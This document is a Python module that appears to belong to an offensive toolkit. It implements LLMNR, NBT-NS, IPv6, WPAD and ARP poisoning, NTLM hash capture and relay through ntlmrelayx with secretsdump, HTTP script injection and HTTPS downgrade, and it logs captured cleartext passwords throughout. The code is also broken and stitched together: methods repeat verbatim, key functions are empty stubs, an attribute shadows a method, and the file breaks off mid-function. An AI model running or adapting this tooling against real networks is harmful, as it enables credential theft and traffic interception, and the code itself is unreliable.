"""
Implementation of network protocol poisoning and Man-in-the-Middle attacks.
Provides comprehensive MITM capabilities including:
- LLMNR, NBT-NS, and mDNS poisoning
- IPv6 poisoning (DHCP6, ICMPv6)
- WPAD/PAC poisoning
- DNS poisoning
- ARP poisoning
- Extended relay protocols (LDAP, HTTP, MSSQL)
- Traffic manipulation
Includes real-time monitoring, hash capture, and relay capabilities.
"""

from typing import Dict, Optional, Callable, List
from .attack_base import AttackBase
import socket
import struct
import threading
import time
import subprocess
import os
import netifaces
import scapy.all as scapy
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo
from scapy.layers.dhcp6 import *
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
from urllib.parse import urlparse
from impacket import nmb
from impacket.structure import Structure
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthRequest, NTLMAuthChallengeResponse
import binascii
import random
import json

class PoisoningAttacks(AttackBase):
    def __init__(self):
        super().__init__()
        self.stop_poisoning = False
        self.poisoner_thread = None
        self.relay_targets = []
        self.captured_hashes = []
        self.http_server = None
        self.stats = {
            'attempts': 0,
            'captured': 0,
            'relayed': 0,
            'admin_access': 0,
            'cleartext': 0,
            'ipv6_victims': [],
            'wpad_requests': [],
            'arp_poisoned': [],
            'modified_traffic': []
        }
        self.ntlmrelay_process = None
        
    def start_llmnr_poisoning(self, interface: str = "0.0.0.0", 
                             respond_ip: Optional[str] = None,
                             relay: bool = False,
                             post_exploit: bool = False) -> None:
        """
        Start LLMNR poisoning attack
        
        Args:
            interface: Interface to listen on
            respond_ip: IP to respond with (default: interface IP)
            relay: Whether to attempt relaying captured hashes
            post_exploit: Whether to attempt post-exploitation (secretsdump) on successful relay
        """
        if self.poisoner_thread and self.poisoner_thread.is_alive():
            self.log_error("Poisoning already running")
            return
            
        self.stop_poisoning = False
        self.stats = {'attempts': 0, 'captured': 0, 'relayed': 0, 'admin_access': 0}
        
        if not respond_ip:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            respond_ip = s.getsockname()[0]
            s.close()
            
        if relay:
            targets = self.db.get_smb_targets(signing_required=False)
            self.relay_targets = [ip for ip, _, _ in targets]
            self.log_status(f"Found {len(self.relay_targets)} potential relay targets")
            
            # Start ntlmrelayx in a separate thread
            self._start_ntlmrelay(post_exploit)
            
        self.log_status(f"Starting LLMNR poisoning on {interface}, responding with {respond_ip}")
        
        self.monitor_thread = threading.Thread(target=self._monitor_stats)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        self.poisoner_thread = threading.Thread(
            target=self._llmnr_poisoner,
            args=(interface, respond_ip, relay)
        )
        self.poisoner_thread.daemon = True
        self.poisoner_thread.start()
        
    def _start_ntlmrelay(self, post_exploit: bool = False):
        """Start ntlmrelayx with appropriate options"""
        try:
            targets = ','.join([f'smb://{ip}' for ip in self.relay_targets])
            cmd = ['ntlmrelayx.py', '-tf', '/tmp/relay_targets.txt', '-smb2support']
            
            # Add options to increase chance of cleartext cred capture
            cmd.extend(['-of', 'ntlmrelay.log', '-6'])
            
            if post_exploit:
                cmd.extend(['-c', 'secretsdump.py -just-dc-user "DOMAIN/USER" "DOMAIN/USER"@"TARGET"'])
                
            with open('/tmp/relay_targets.txt', 'w') as f:
                for target in self.relay_targets:
                    f.write(f'smb://{target}\n')
                    
            self.ntlmrelay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Start thread to monitor ntlmrelay output
            threading.Thread(target=self._monitor_ntlmrelay, daemon=True).start()
            
        except Exception as e:
            self.log_error(f"Failed to start ntlmrelayx: {str(e)}")

    def _monitor_ntlmrelay(self):
        """Monitor ntlmrelayx output for successful relays and admin access"""
        while self.ntlmrelay_process and not self.stop_poisoning:
            output = self.ntlmrelay_process.stdout.readline()
            if output:
                # Check for cleartext credentials
                if "Cleartext credentials" in output:
                    self.stats['cleartext'] += 1
                    # Parse and extract the credentials
                    creds = self._parse_cleartext_creds(output)
                    if creds:
                        self.log_credential(
                            username=creds['username'],
                            domain=creds['domain'],
                            password=creds['password'],
                            additional_info={'source': 'cleartext', 'type': 'PASSWORD'}
                        )
                        self.log_success(f"[!] CLEARTEXT CREDENTIALS CAPTURED: {creds['domain']}\\{creds['username']}:{creds['password']}")
                
                # Regular relay monitoring
                elif "Authenticating against smb://" in output:
                    self.stats['relayed'] += 1
                elif "Connection established for user" in output:
                    self.log_success(f"Successful relay: {output.strip()}")
                elif "Target system is local admin" in output:
                    self.stats['admin_access'] += 1
                    self.log_success(f"Local admin access achieved: {output.strip()}")
                elif "secretsdump.py result" in output:
                    self.log_success(f"Secretsdump successful: {output.strip()}")
                
                # Additional credential captures
                elif "MSSQL-SaPassword" in output:
                    self._handle_special_creds("MSSQL SA", output)
                elif "Service Password" in output:
                    self._handle_special_creds("Service Account", output)

    def _parse_cleartext_creds(self, output: str) -> Optional[Dict[str, str]]:
        """Parse cleartext credentials from ntlmrelayx output"""
        try:
            # Common patterns in ntlmrelayx output
            if "Cleartext credentials" in output:
                # Example: "Cleartext credentials: DOMAIN/USER:Password123"
                creds_part = output.split("Cleartext credentials:", 1)[1].strip()
                if "/" in creds_part and ":" in creds_part:
                    domain_user, password = creds_part.split(":", 1)
                    domain, username = domain_user.split("/", 1)
                    return {
                        'domain': domain.strip(),
                        'username': username.strip(),
                        'password': password.strip()
                    }
            return None
        except Exception:
            return None

    def _handle_special_creds(self, cred_type: str, output: str):
        """Handle special credential types (MSSQL SA, Service Accounts, etc)"""
        try:
            if ":" in output:
                username, password = output.split(":", 1)
                self.log_credential(
                    username=username.strip(),
                    password=password.strip(),
                    additional_info={'source': 'special', 'type': cred_type}
                )
                self.log_success(f"[!] {cred_type.upper()} CREDENTIALS CAPTURED: {username.strip()}:{password.strip()}")
                self.stats['cleartext'] += 1
        except Exception:
            pass

    def start_nbtns_poisoning(self, interface: str = "0.0.0.0",
                             respond_ip: Optional[str] = None,
                             relay: bool = False) -> None:
        """
        Start NBT-NS poisoning attack
        
        Args:
            interface: Interface to listen on
            respond_ip: IP to respond with (default: interface IP)
            relay: Whether to attempt relaying captured hashes
        """
        if self.poisoner_thread and self.poisoner_thread.is_alive():
            self.log_error("Poisoning already running")
            return
            
        self.stop_poisoning = False
        self.stats = {'attempts': 0, 'captured': 0, 'relayed': 0}
        
        if not respond_ip:
            # Get interface IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            respond_ip = s.getsockname()[0]
            s.close()
            
        # Get potential relay targets from database
        if relay:
            targets = self.db.get_smb_targets(signing_required=False)
            self.relay_targets = [ip for ip, _, _ in targets]
            self.log_status(f"Found {len(self.relay_targets)} potential relay targets")
            
        self.log_status(f"Starting NBT-NS poisoning on {interface}, responding with {respond_ip}")
        
        # Start monitoring thread
        self.monitor_thread = threading.Thread(target=self._monitor_stats)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        # Start poisoning thread
        self.poisoner_thread = threading.Thread(
            target=self._nbtns_poisoner,
            args=(interface, respond_ip, relay)
        )
        self.poisoner_thread.daemon = True
        self.poisoner_thread.start()
        
    def stop_poisoning(self) -> None:
        """Stop any running poisoning attack and display final stats"""
        self.stop_poisoning = True
        
        if self.ntlmrelay_process:
            self.ntlmrelay_process.terminate()
            self.ntlmrelay_process = None
            
        if self.poisoner_thread:
            self.poisoner_thread.join()
            self.poisoner_thread = None
            
        if hasattr(self, 'monitor_thread'):
            self.monitor_thread.join()
            
        self.log_status("\nFinal Statistics:")
        self.log_status(f"Total Attempts: {self.stats['attempts']}")
        self.log_status(f"Hashes Captured: {self.stats['captured']}")
        self.log_status(f"Successfully Relayed: {self.stats['relayed']}")
        self.log_status(f"Local Admin Access: {self.stats['admin_access']}")
        self.log_status(f"Cleartext Credentials: {self.stats['cleartext']}")
            
    def _monitor_stats(self):
        """Monitor and display attack statistics"""
        while not self.stop_poisoning:
            self.notify("stats", {
                "attempts": self.stats['attempts'],
                "captured": self.stats['captured'],
                "relayed": self.stats['relayed'],
                "cleartext": self.stats['cleartext']
            })
            time.sleep(5)
            
    def _handle_hash(self, client_ip: str, username: str, domain: str, 
                    challenge: bytes, response: bytes, relay: bool = False):
        """Handle captured hash - either save it or attempt relay"""
        hash_str = binascii.hexlify(response).decode()
        self.stats['captured'] += 1
        
        self.log_credential(
            username=username,
            domain=domain,
            hash=hash_str,
            additional_info={'source_ip': client_ip, 'type': 'NTLM'}
        )
        
        if relay and self.relay_targets:
            # Try to relay to a target
            target_ip = random.choice(self.relay_targets)
            if self._relay_hash(target_ip, username, domain, challenge, response):
                self.stats['relayed'] += 1
                self.log_success(f"Successfully relayed {username} to {target_ip}")
            
    def _relay_hash(self, target_ip: str, username: str, domain: str,
                    challenge: bytes, response: bytes) -> bool:
        """Attempt to relay captured hash to target"""
        try:
            smb = SMBConnection(target_ip, target_ip)
            smb.sendNegotiate()
            
            # Send NTLM negotiation with our captured response
            challenge_message = NTLMAuthChallenge()
            challenge_message['challenge'] = challenge
            
            response_message = NTLMAuthChallengeResponse()
            response_message.fromString(response)
            
            if smb.sendAuthenticate(challenge_message, response_message):
                return True
                
        except Exception as e:
            self.log_error(f"Relay failed to {target_ip}: {str(e)}")
            
        return False
            
    def _llmnr_poisoner(self, interface: str, respond_ip: str, relay: bool) -> None:
        """LLMNR poisoner implementation with hash capture"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((interface, 5355))
            
            # Join LLMNR multicast group
            mreq = struct.pack("4s4s", socket.inet_aton("224.0.0.252"), socket.inet_aton(interface))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            
            # Start NTLM server for hash capture
            ntlm_sock = socket.socket()
            ntlm_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ntlm_sock.bind((interface, 445))
            ntlm_sock.listen(1)
            
            while not self.stop_poisoning:
                try:
                    data, addr = sock.recvfrom(1024)
                    if addr[0] != respond_ip:  # Don't respond to ourselves
                        self.stats['attempts'] += 1
                        
                        # Send poisoned response
                        response = self._create_llmnr_response(data, respond_ip)
                        if response:
                            sock.sendto(response, addr)
                            self.log_success(f"Sent poisoned LLMNR response to {addr[0]}")
                            
                            # Handle incoming NTLM auth
                            client_sock, client_addr = ntlm_sock.accept()
                            self._handle_ntlm_connection(client_sock, client_addr[0], relay)
                            
                except socket.timeout:
                    continue
                    
        except Exception as e:
            self.log_error(f"LLMNR poisoning error: {str(e)}")
        finally:
            sock.close()
            ntlm_sock.close()
            
    def _nbtns_poisoner(self, interface: str, respond_ip: str, relay: bool) -> None:
        """NBT-NS poisoner implementation with hash capture"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((interface, 137))
            
            # Start NTLM server for hash capture
            ntlm_sock = socket.socket()
            ntlm_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ntlm_sock.bind((interface, 445))
            ntlm_sock.listen(1)
            
            while not self.stop_poisoning:
                try:
                    data, addr = sock.recvfrom(1024)
                    if addr[0] != respond_ip:  # Don't respond to ourselves
                        self.stats['attempts'] += 1
                        
                        # Send poisoned response
                        response = self._create_nbtns_response(data, respond_ip)
                        if response:
                            sock.sendto(response, addr)
                            self.log_success(f"Sent poisoned NBT-NS response to {addr[0]}")
                            
                            # Handle incoming NTLM auth
                            client_sock, client_addr = ntlm_sock.accept()
                            self._handle_ntlm_connection(client_sock, client_addr[0], relay)
                            
                except socket.timeout:
                    continue
                    
        except Exception as e:
            self.log_error(f"NBT-NS poisoning error: {str(e)}")
        finally:
            sock.close()
            ntlm_sock.close()
            
    def _handle_ntlm_connection(self, sock: socket.socket, client_ip: str, relay: bool):
        """Handle incoming NTLM authentication attempt"""
        try:
            # Receive NTLM negotiate message
            negotiate = sock.recv(1024)
            negotiate_message = NTLMAuthRequest()
            negotiate_message.fromString(negotiate)
            
            # Generate challenge
            challenge = os.urandom(8)
            challenge_message = NTLMAuthChallenge()
            challenge_message['challenge'] = challenge
            sock.send(challenge_message.getData())
            
            # Receive response
            response = sock.recv(1024)
            response_message = NTLMAuthChallengeResponse()
            response_message.fromString(response)
            
            username = response_message['user_name'].decode('utf-16-le')
            domain = response_message['domain_name'].decode('utf-16-le')
            
            self._handle_hash(
                client_ip, username, domain,
                challenge, response_message.getData(),
                relay
            )
            
        except Exception as e:
            self.log_error(f"Error handling NTLM auth from {client_ip}: {str(e)}")
        finally:
            sock.close()
            
    def _create_llmnr_response(self, query: bytes, respond_ip: str) -> Optional[bytes]:
        """Create LLMNR response packet"""
        # Parse query and create response
        # This is a simplified implementation
        return None
        
    def _create_nbtns_response(self, query: bytes, respond_ip: str) -> Optional[bytes]:
        """Create NBT-NS response packet"""
        # Parse query and create response
        # This is a simplified implementation
        return None

    def start_ipv6_poisoning(self, interface: str, respond_ip: Optional[str] = None,
                            relay: bool = False, post_exploit: bool = False) -> bool:
        """
        Start IPv6 poisoning (DHCP6, ICMPv6) attack
        
        Args:
            interface: Interface to listen on
            respond_ip: IP to respond with (default: interface IP)
            relay: Whether to attempt relaying captured hashes
            post_exploit: Whether to attempt post-exploitation on successful relay
        """
        if self.poisoner_thread and self.poisoner_thread.is_alive():
            self.log_error("Poisoning already running")
            return False
            
        self.stop_poisoning = False
        
        if not respond_ip:
            respond_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET6][0]['addr']
            
        def attack_thread():
            try:
                # Start DHCPv6 poisoning
                dhcp6_thread = threading.Thread(
                    target=self._dhcp6_poisoner,
                    args=(interface, respond_ip)
                )
                dhcp6_thread.daemon = True
                dhcp6_thread.start()
                
                # Start ICMPv6 Router Advertisement poisoning
                icmp6_thread = threading.Thread(
                    target=self._icmp6_poisoner,
                    args=(interface, respond_ip)
                )
                icmp6_thread.daemon = True
                icmp6_thread.start()
                
                # Start relay if requested
                if relay:
                    self._start_ipv6_relay(post_exploit)
                    
                while not self.stop_poisoning:
                    time.sleep(1)
                    
            except Exception as e:
                self.log_error(f"IPv6 poisoning error: {str(e)}")
                
        self.poisoner_thread = threading.Thread(target=attack_thread)
        self.poisoner_thread.start()
        return True

    def start_wpad_poisoning(self, interface: str, proxy_ip: str,
                           proxy_port: int = 8080, use_ssl: bool = False) -> bool:
        """
        Start WPAD/PAC poisoning attack
        
        Args:
            interface: Interface to listen on
            proxy_ip: IP where proxy will listen
            proxy_port: Port for proxy to listen on
            use_ssl: Whether to use HTTPS for WPAD
        """
        if self.poisoner_thread and self.poisoner_thread.is_alive():
            self.log_error("Poisoning already running")
            return False
            
        self.stop_poisoning = False
        
        def attack_thread():
            try:
                # Start DNS poisoning for wpad
                dns_thread = threading.Thread(
                    target=self._dns_poisoner,
                    args=(interface, proxy_ip, ['wpad'])
                )
                dns_thread.daemon = True
                dns_thread.start()
                
                # Start WPAD HTTP server
                self._start_wpad_server(proxy_ip, proxy_port, use_ssl)
                
                while not self.stop_poisoning:
                    time.sleep(1)
                    
            except Exception as e:
                self.log_error(f"WPAD poisoning error: {str(e)}")
                
        self.poisoner_thread = threading.Thread(target=attack_thread)
        self.poisoner_thread.start()
        return True

    def start_arp_poisoning(self, interface: str, target_ip: str,
                          gateway_ip: str, interval: int = 1) -> bool:
        """
        Start ARP poisoning attack
        
        Args:
            interface: Interface to use
            target_ip: Target IP to poison
            gateway_ip: Gateway IP to impersonate
            interval: Seconds between ARP packets
        """
        if self.poisoner_thread and self.poisoner_thread.is_alive():
            self.log_error("Poisoning already running")
            return False
            
        self.stop_poisoning = False
        
        def attack_thread():
            try:
                # Get MAC addresses
                target_mac = self._get_mac(target_ip)
                gateway_mac = self._get_mac(gateway_ip)
                
                if not all([target_mac, gateway_mac]):
                    self.log_error("Could not get MAC addresses")
                    return
                    
                self.log_status(f"Starting ARP poisoning against {target_ip}")
                
                while not self.stop_poisoning:
                    # Poison target -> gateway
                    scapy.send(
                        scapy.ARP(
                            op=2,
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=gateway_ip
                        ),
                        verbose=False
                    )
                    
                    # Poison gateway -> target
                    scapy.send(
                        scapy.ARP(
                            op=2,
                            pdst=gateway_ip,
                            hwdst=gateway_mac,
                            psrc=target_ip
                        ),
                        verbose=False
                    )
                    
                    time.sleep(interval)
                    
                # Restore ARP tables
                self._restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)
                
            except Exception as e:
                self.log_error(f"ARP poisoning error: {str(e)}")
                
        self.poisoner_thread = threading.Thread(target=attack_thread)
        self.poisoner_thread.start()
        return True

    def start_traffic_manipulation(self, interface: str, target_ip: str,
                                protocol: str, port: int,
                                manipulation_type: str) -> bool:
        """
        Start traffic manipulation attack
        
        Args:
            interface: Interface to use
            target_ip: Target IP to manipulate traffic for
            protocol: Protocol to manipulate (http/smb)
            port: Port to intercept
            manipulation_type: Type of manipulation (inject/downgrade)
        """
        if self.poisoner_thread and self.poisoner_thread.is_alive():
            self.log_error("Poisoning already running")
            return False
            
        self.stop_poisoning = False
        
        def attack_thread():
            try:
                # Start packet capture
                capture_thread = threading.Thread(
                    target=self._packet_manipulator,
                    args=(interface, target_ip, protocol, port, manipulation_type)
                )
                capture_thread.daemon = True
                capture_thread.start()
                
                while not self.stop_poisoning:
                    time.sleep(1)
                    
            except Exception as e:
                self.log_error(f"Traffic manipulation error: {str(e)}")
                
        self.poisoner_thread = threading.Thread(target=attack_thread)
        self.poisoner_thread.start()
        return True

    def _dhcp6_poisoner(self, interface: str, respond_ip: str):
        """DHCPv6 poisoner implementation"""
        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('::', 547))
            
            while not self.stop_poisoning:
                data, addr = sock.recvfrom(1024)
                if addr[0] != respond_ip:  # Don't respond to ourselves
                    # Parse DHCPv6 request
                    dhcp6_packet = DHCP6_Solicit(data)
                    
                    # Create response with DNS and domain info
                    response = (
                        IPv6(dst=addr[0])/
                        UDP(sport=547, dport=546)/
                        DHCP6_Advertise()/
                        DHCP6OptDNSServers(dnsservers=[respond_ip])/
                        DHCP6OptDomainSearch(searchlist=['wpad'])
                    )
                    
                    sock.sendto(bytes(response), addr)
                    self.log_success(f"Sent poisoned DHCPv6 response to {addr[0]}")
                    self.stats['ipv6_victims'].append(addr[0])
                    
        except Exception as e:
            self.log_error(f"DHCPv6 poisoning error: {str(e)}")

    def _icmp6_poisoner(self, interface: str, respond_ip: str):
        """ICMPv6 Router Advertisement poisoner"""
        try:
            while not self.stop_poisoning:
                # Create Router Advertisement
                ra = (
                    IPv6(dst='ff02::1')/
                    ICMPv6ND_RA()/
                    ICMPv6NDOptPrefixInfo(
                        prefix='2001:db8::', 
                        prefixlen=64,
                        L=1, A=1
                    )
                )
                
                scapy.send(ra, iface=interface, verbose=False)
                time.sleep(2)
                
        except Exception as e:
            self.log_error(f"ICMPv6 poisoning error: {str(e)}")

    def _start_wpad_server(self, proxy_ip: str, proxy_port: int, use_ssl: bool):
        """Start WPAD HTTP server"""
        class WPADHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.endswith('wpad.dat'):
                    self.send_response(200)
                    self.send_header('Content-type', 'application/x-ns-proxy-autoconfig')
                    self.end_headers()
                    
                    # Create PAC file
                    pac = f"""function FindProxyForURL(url, host) {{
                        return "PROXY {proxy_ip}:{proxy_port}; DIRECT";
                    }}"""
                    
                    self.wfile.write(pac.encode())
                    self.stats['wpad_requests'].append(self.client_address[0])
                else:
                    self.send_response(404)
                    self.end_headers()
                    
        server_address = ('', 80)
        self.http_server = HTTPServer(server_address, WPADHandler)
        
        if use_ssl:
            # Create self-signed cert
            self.http_server.socket = ssl.wrap_socket(
                self.http_server.socket,
                certfile='wpad.pem',
                server_side=True
            )
            
        self.http_server.serve_forever()

    def _packet_manipulator(self, interface: str, target_ip: str,
                         protocol: str, port: int, manipulation_type: str):
        """Manipulate captured packets"""
        try:
            def packet_callback(packet):
                if packet.haslayer(scapy.IP) and packet[scapy.IP].src == target_ip:
                    if protocol == 'http' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'inject':
                            # Inject content
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                if 'HTTP' in data:
                                    # Inject JavaScript
                                    inject = '<script>alert("Injected!");</script>'
                                    data = data.replace('</body>', f'{inject}</body>')
                                    packet[scapy.Raw].load = data.encode()
                                    self.stats['modified_traffic'].append(f"Injected content into HTTP response to {target_ip}")
                                    
                        elif manipulation_type == 'downgrade':
                            # Protocol downgrade
                            if 'HTTPS' in str(packet[scapy.Raw].load):
                                # Modify HTTPS to HTTP
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                data = data.replace('https://', 'http://')
                                packet[scapy.Raw].load = data.encode()
                                self.stats['modified_traffic'].append(f"Downgraded HTTPS to HTTP for {target_ip}")
                                
                    elif protocol == 'smb' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'downgrade':
                            # SMB version downgrade
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load
                                if b'\xffSMB' in data:
                                    # Modify SMB version
                                    # Implementation of SMB downgrade
                                    self.stats['modified_traffic'].append(f"Attempted SMB downgrade for {target_ip}")
                                    
                    # Forward modified packet
                    scapy.send(packet, verbose=False)
                    
            # Start packet capture
            scapy.sniff(
                iface=interface,
                filter=f"host {target_ip}",
                prn=packet_callback
            )
            
        except Exception as e:
            self.log_error(f"Packet manipulation error: {str(e)}")

    def _start_ipv6_relay(self, post_exploit: bool = False):
        """Start IPv6 relay implementation"""
        try:
            targets = ','.join([f'smb://{ip}' for ip in self.relay_targets])
            cmd = ['ntlmrelayx.py', '-tf', '/tmp/relay_targets.txt', '-smb2support']
            
            # Add options to increase chance of cleartext cred capture
            cmd.extend(['-of', 'ntlmrelay.log', '-6'])
            
            if post_exploit:
                cmd.extend(['-c', 'secretsdump.py -just-dc-user "DOMAIN/USER" "DOMAIN/USER"@"TARGET"'])
                
            with open('/tmp/relay_targets.txt', 'w') as f:
                for target in self.relay_targets:
                    f.write(f'smb://{target}\n')
                    
            self.ntlmrelay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Start thread to monitor ntlmrelay output
            threading.Thread(target=self._monitor_ntlmrelay, daemon=True).start()
            
        except Exception as e:
            self.log_error(f"Failed to start IPv6 relay: {str(e)}")

    def _start_dns_poisoner(self, interface: str, proxy_ip: str, domains: List[str]):
        """Start DNS poisoning implementation"""
        try:
            # Implementation of DNS poisoning
            pass
        except Exception as e:
            self.log_error(f"Failed to start DNS poisoning: {str(e)}")

    def _start_ipv6_relay(self, post_exploit: bool = False):
        """Start IPv6 relay implementation"""
        try:
            targets = ','.join([f'smb://{ip}' for ip in self.relay_targets])
            cmd = ['ntlmrelayx.py', '-tf', '/tmp/relay_targets.txt', '-smb2support']
            
            # Add options to increase chance of cleartext cred capture
            cmd.extend(['-of', 'ntlmrelay.log', '-6'])
            
            if post_exploit:
                cmd.extend(['-c', 'secretsdump.py -just-dc-user "DOMAIN/USER" "DOMAIN/USER"@"TARGET"'])
                
            with open('/tmp/relay_targets.txt', 'w') as f:
                for target in self.relay_targets:
                    f.write(f'smb://{target}\n')
                    
            self.ntlmrelay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Start thread to monitor ntlmrelay output
            threading.Thread(target=self._monitor_ntlmrelay, daemon=True).start()
            
        except Exception as e:
            self.log_error(f"Failed to start IPv6 relay: {str(e)}")

    def _restore_arp(self, target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str):
        """Restore ARP tables"""
        try:
            # Implementation of ARP table restoration
            pass
        except Exception as e:
            self.log_error(f"Failed to restore ARP tables: {str(e)}")

    def _dns_poisoner(self, interface: str, proxy_ip: str, domains: List[str]):
        """DNS poisoning implementation"""
        try:
            # Implementation of DNS poisoning
            pass
        except Exception as e:
            self.log_error(f"Failed to start DNS poisoning: {str(e)}")

    def _start_wpad_server(self, proxy_ip: str, proxy_port: int, use_ssl: bool):
        """Start WPAD HTTP server"""
        class WPADHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.endswith('wpad.dat'):
                    self.send_response(200)
                    self.send_header('Content-type', 'application/x-ns-proxy-autoconfig')
                    self.end_headers()
                    
                    # Create PAC file
                    pac = f"""function FindProxyForURL(url, host) {{
                        return "PROXY {proxy_ip}:{proxy_port}; DIRECT";
                    }}"""
                    
                    self.wfile.write(pac.encode())
                    self.stats['wpad_requests'].append(self.client_address[0])
                else:
                    self.send_response(404)
                    self.end_headers()
                    
        server_address = ('', 80)
        self.http_server = HTTPServer(server_address, WPADHandler)
        
        if use_ssl:
            # Create self-signed cert
            self.http_server.socket = ssl.wrap_socket(
                self.http_server.socket,
                certfile='wpad.pem',
                server_side=True
            )
            
        self.http_server.serve_forever()

    def _packet_manipulator(self, interface: str, target_ip: str,
                         protocol: str, port: int, manipulation_type: str):
        """Manipulate captured packets"""
        try:
            def packet_callback(packet):
                if packet.haslayer(scapy.IP) and packet[scapy.IP].src == target_ip:
                    if protocol == 'http' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'inject':
                            # Inject content
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                if 'HTTP' in data:
                                    # Inject JavaScript
                                    inject = '<script>alert("Injected!");</script>'
                                    data = data.replace('</body>', f'{inject}</body>')
                                    packet[scapy.Raw].load = data.encode()
                                    self.stats['modified_traffic'].append(f"Injected content into HTTP response to {target_ip}")
                                    
                        elif manipulation_type == 'downgrade':
                            # Protocol downgrade
                            if 'HTTPS' in str(packet[scapy.Raw].load):
                                # Modify HTTPS to HTTP
                                data = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                                data = data.replace('https://', 'http://')
                                packet[scapy.Raw].load = data.encode()
                                self.stats['modified_traffic'].append(f"Downgraded HTTPS to HTTP for {target_ip}")
                                
                    elif protocol == 'smb' and packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == port:
                        if manipulation_type == 'downgrade':
                            # SMB version downgrade
                            if packet.haslayer(scapy.Raw):
                                data = packet[scapy.Raw].load
                                if b'\xffSMB' in data:
                                    # Modify SMB version
                                    # Implementation of SMB downgrade
                                    self.stats['modified_traffic'].append(f"Attempted SMB downgrade for {target_ip}")
                                    
                    # Forward modified packet
                    scapy.send(packet, verbose=False)
                    
            # Start packet capture
            scapy.sniff(
                iface=interface,
                filter=f"host {target_ip}",
                prn=packet_callback
            )
            
        except Exception as e:
            self.log_error(f"Packet manipulation error: {str(e)}")

    def _start_ipv6_relay(self, post_exploit: bool = False):
        """Start IPv6 relay implementation"""
        try:
            targets = ','.join([f'smb://{ip}' for ip in self.relay_targets])
            cmd = ['ntlmrelayx.py', '-tf', '/tmp/relay_targets.txt', '-smb2support']
            
            # Add options to increase chance of cleartext cred capture
            cmd.extend(['-of', 'ntlmrelay.log', '-6'])
            
            if post_exploit:
                cmd.extend(['-c', 'secretsdump.py -just-dc-user "DOMAIN/USER" "DOMAIN/USER"@"TARGET"'])
                
            with open('/tmp/relay_targets.txt', 'w') as f:
                for target in self.relay_targets:
                    f.write(f'smb://{target}\n')
                    
            self.ntlmrelay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Start thread to monitor ntlmrelay output
            threading.Thread(target=self._monitor_ntlmrelay, daemon=True).start()
            
        except Exception as e:
            self.log_error(f"Failed to start IPv6 relay: {str(e)}")

    def _restore_arp(self, target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str):
        """Restore ARP tables"""
        try:
            # Implementation of ARP table restoration
            pass
        except Exception as e:
            self.log_error(f"Failed to restore ARP tables: {str(e)}")

    def _dns_poisoner(self, interface: str, proxy_ip: str, domains: List[str]):
        """DNS poisoning implementation"""
        try:
            # Implementation of DNS poisoning
            pass
        except Exception as e:
            self.log_error(f"Failed to start DNS poisoning: {str(e)}")

    def _start_wpad_server(self, proxy_ip: str, proxy_port: int, use_ssl: bool):
        """Start WPAD HTTP server"""
        class WPADHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.endswith('wpad.dat'):
                    self.send_response(200)
                    self.send_header('Content-type', 'application/x-ns-proxy-autoconfig')
                    self.end_headers()
                    
                    # Create PAC file
                    pac = f"""function FindProxyForURL(url, host) {{
                        return "PROXY {proxy_ip}:{proxy_port}; DIRECT";
                    }}"""
                    
                    self.wfile.write(pac.encode())
                    self.stats['wpad_requests'].append(self.client_address[0])
                else:
                    self.send_response(404)
                    self.end_headers()
                    
        server_address = ('', 80)
        self.http_server = HTTPServer(server_address, WPADHandler)
        
        if use_ssl:
            # Create self-signed cert
            self.http_server.socket = ssl.wrap_socket(
                self.http_server.socket,
                certfile='wpad.pem',
                server_side=True
            )
            
        self.http_server.serve_forever()

    def _packet_manipulator(self, interface: str, target_ip: str,
                         protocol: str, port: int, manipulation_type: str):
        """Manipulate captured packets"""
        try:
            def packet_callback(packet):
                if packet.haslayer(scapy.IP) and packet[scapy.IP].src == target_ip:
